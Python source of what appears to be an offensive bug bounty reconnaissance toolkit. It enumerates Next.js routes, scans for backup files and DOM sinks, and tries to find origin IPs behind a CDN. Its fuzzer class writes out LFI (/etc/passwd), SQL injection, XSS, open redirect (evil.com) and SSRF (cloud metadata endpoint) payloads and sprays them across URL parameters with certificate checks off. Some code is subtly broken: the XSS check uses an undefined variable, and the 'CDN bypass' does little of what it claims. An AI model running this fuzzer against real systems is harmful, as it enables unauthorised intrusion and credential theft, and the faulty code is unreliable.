"""
Advanced Bug Bounty Reconnaissance Toolkit.
Implements top techniques from community methodologies:
- Next.js __BUILD_MANIFEST enumeration
- qsreplace auto-fuzzing for IDOR/LFI/Open Redirect
- GetURL keywords + JS domain discovery
- DOM sink detection (innerHTML, postMessage)
- Backup file scanner (bfac-style)
- CDN/Cloudflare real IP bypass
"""
import asyncio
import json
import re
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs

import httpx

from itzraven.core.logger import get_logger

logger = get_logger()


class NextJSManifestEnumerator:
    """Enumerate all Next.js routes via __BUILD_MANIFEST."""

    async def enumerate(self, target: str) -> List[str]:
        base = target.rstrip("/")
        manifest_paths = [
            "/__BUILD_MANIFEST",
            "/_next/static/__BUILD_MANIFEST",
            "/_next/static/chunks/__BUILD_MANIFEST",
            "/__NEXT_DATA__",
        ]
        routes = []

        async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=True) as client:
            for path in manifest_paths:
                try:
                    r = await client.get(base + path)
                    if r.status_code != 200:
                        continue

                    # __BUILD_MANIFEST contains sortedPages array
                    text = r.text
                    if "sortedPages" in text or "__NEXT_DATA__" in text:
                        found = re.findall(r'"(/[^"]+)"', text)
                        for route in found:
                            if route.startswith("/") and not route.startswith("//"):
                                clean = route.split("?")[0]
                                if clean not in routes:
                                    routes.append(clean)
                except Exception:
                    continue

        if routes:
            logger.info(f"  Next.js: Found {len(routes)} routes via manifest")
        return routes


class QSReplaceFuzzer:
    """Replace all URL parameters with payloads en masse using qsreplace-style logic."""

    PAYLOADS = {
        "lfi": "../../../../etc/passwd",
        "open_redirect": "https://evil.com/",
        "sqli": "' OR '1'='1",
        "xss": "<script>alert(1)</script>",
        "idor": "9999999",
        "ssrf": "http://169.254.169.254/latest/meta-data/",
    }

    async def fuzz_urls(self, urls: List[str], vuln_type: str = "lfi") -> List[Dict]:
        if vuln_type not in self.PAYLOADS:
            return []
        payload = self.PAYLOADS[vuln_type]
        results = []

        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False) as client:
            for url in urls[:50]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if not params:
                    continue

                # Replace each param value with our payload
                for param in params:
                    new_query = "&".join(
                        f"{p}={payload if p == param else params[p][0]}"
                        for p in params
                    )
                    fuzz_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                    try:
                        r = await client.get(fuzz_url, timeout=6)
                        indicator = self._detect(vuln_type, r)
                        if indicator:
                            results.append({
                                "url": url,
                                "param": param,
                                "payload": payload,
                                "status": r.status_code,
                                "indicator": indicator,
                            })
                    except Exception:
                        continue

        return results

    def _detect(self, vuln_type: str, response) -> Optional[str]:
        body = response.text.lower()
        if vuln_type == "lfi" and ("root:" in body or "bin/bash" in body or "nobody:" in body):
            return "File content detected in response"
        if vuln_type == "open_redirect" and response.status_code in (301, 302):
            loc = response.headers.get("location", "")
            if "evil.com" in loc:
                return f"Redirects to external: {loc}"
        if vuln_type == "sqli":
            for sig in ["sql", "syntax", "mysql", "unclosed quotation"]:
                if sig in body:
                    return f"SQL error: {sig}"
        if vuln_type == "xss" and payload in body:
            return "Payload reflected unencoded"
        return None


class DOMSinkDetector:
    """Find DOM-based XSS sinks in JavaScript files."""

    SINKS = [
        "innerHTML", "outerHTML", "document.write", "document.writeln",
        "eval(", "setTimeout(", "setInterval(",
        "location=", "location.href=", "location.replace(",
        "postMessage(", "onmessage=",
        "insertAdjacentHTML", "createContextualFragment",
        "$html(", ".html(", "dangerouslySetInnerHTML",
        "v-html", "v-bind",
    ]

    async def scan_js(self, js_urls: List[str]) -> List[Dict]:
        results = []
        async with httpx.AsyncClient(timeout=10, verify=False) as client:
            for url in js_urls[:30]:
                try:
                    r = await client.get(url)
                    if r.status_code != 200:
                        continue
                    content = r.text
                    for sink in self.SINKS:
                        if sink in content:
                            # Get context
                            idx = content.index(sink)
                            context = content[max(0, idx - 30): idx + 50]
                            results.append({
                                "url": url,
                                "sink": sink,
                                "context": context.strip(),
                            })
                except Exception:
                    continue
        return results


class BackupFileScanner:
    """Find backup/original files with common extensions."""

    EXTENSIONS = [
        ".bak", ".old", ".orig", ".backup", "~", ".swp", ".swo",
        ".save", ".tmp", ".temp", ".copy", ".txt", ".tar.gz", ".zip",
        ".php~", ".php.old", ".php.bak", ".php.save",
    ]

    async def scan(self, base_url: str, paths: List[str]) -> List[Dict]:
        results = []
        async with httpx.AsyncClient(timeout=5, verify=False, follow_redirects=False) as client:
            for path in paths[:20]:
                for ext in self.EXTENSIONS:
                    url = base_url.rstrip("/") + path + ext
                    try:
                        r = await client.get(url)
                        if r.status_code == 200 and len(r.text) > 10:
                            results.append({
                                "path": path,
                                "backup_url": url,
                                "ext": ext,
                                "size": len(r.text),
                            })
                    except Exception:
                        continue
        return results


class CDNOriginBypass:
    """Bypass CDN/Cloudflare to find real IP via multiple techniques."""

    TECHNIQUES = [
        "https://{target}",
        "http://{target}",
        "https://www.{target}",
        "http://www.{target}",
        "https://mail.{target}",
        "https://ftp.{target}",
        "https://direct.{target}",
        "https://admin.{target}",
    ]

    SHODAN_DOMAINS = [
        "https://internetdb.shodan.io/{ip}",
    ]

    async def find_origin(self, domain: str) -> Dict[str, List[str]]:
        results: Dict[str, List[str]] = {"ips": [], "techniques": []}

        import socket
        try:
            ips = await asyncio.get_event_loop().run_in_executor(
                None, socket.gethostbyname_ex, domain
            )
            for ip in ips[2]:
                results["ips"].append(ip)
                results["techniques"].append(f"direct_dns:{ip}")
        except Exception:
            pass

        async with httpx.AsyncClient(timeout=8, verify=False) as client:
            for tech in self.TECHNIQUES[:6]:
                url = tech.replace("{target}", domain)
                try:
                    r = await client.get(url, follow_redirects=True)
                    if "cloudflare" not in r.text.lower()[:500]:
                        real_ip = r.headers.get("x-real-ip", "")
                        if real_ip:
                            results["ips"].append(real_ip)
                            results["techniques"].append(f"{tech}:{real_ip}")
                except Exception:
                    continue

        return results
